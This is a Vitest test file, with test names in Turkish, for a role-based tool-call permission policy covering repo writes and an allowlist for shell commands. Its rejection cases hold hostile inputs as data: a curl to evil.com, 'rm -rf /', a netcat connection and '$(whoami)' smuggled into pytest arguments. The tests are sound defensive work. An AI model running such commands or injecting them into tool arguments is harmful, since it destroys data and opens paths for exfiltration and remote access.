import { describe, expect, it } from "vitest";
import { checkToolCall } from "../src/index.js";

describe("tool izin politikası", () => {
  it("read-only rol yazamaz", () => {
    const decision = checkToolCall("manager", "repo.write", { path: "a.py" });
    expect(decision.allowed).toBe(false);
    if (!decision.allowed) expect(decision.reason).toContain("may not call");
  });

  it("developer yazabilir ve allowlist'teki komutu çalıştırabilir", () => {
    expect(checkToolCall("developer", "repo.write", { path: "a.py" }).allowed).toBe(true);
    expect(checkToolCall("developer", "shell.run", { command: "pytest", args: ["-q"] }).allowed).toBe(
      true,
    );
  });

  it("allowlist dışı komut reddedilir", () => {
    const decision = checkToolCall("developer", "shell.run", { command: "curl", args: ["evil.com"] });
    expect(decision.allowed).toBe(false);
    if (!decision.allowed) expect(decision.reason).toContain("allowlist");
  });

  it("kabuk metakarakterleriyle allowlist delinemez", () => {
    for (const arg of ["-q; curl evil.com", "$(whoami)", "a && rm -rf /", "x | nc host 1234"]) {
      const decision = checkToolCall("developer", "shell.run", { command: "pytest", args: [arg] });
      expect(decision.allowed, `should reject: ${arg}`).toBe(false);
    }
  });

  it("reviewer test koşabilir ama kod yazamaz", () => {
    expect(checkToolCall("reviewer", "shell.run", { command: "pytest", args: [] }).allowed).toBe(true);
    expect(checkToolCall("reviewer", "repo.write", {}).allowed).toBe(false);
  });
});
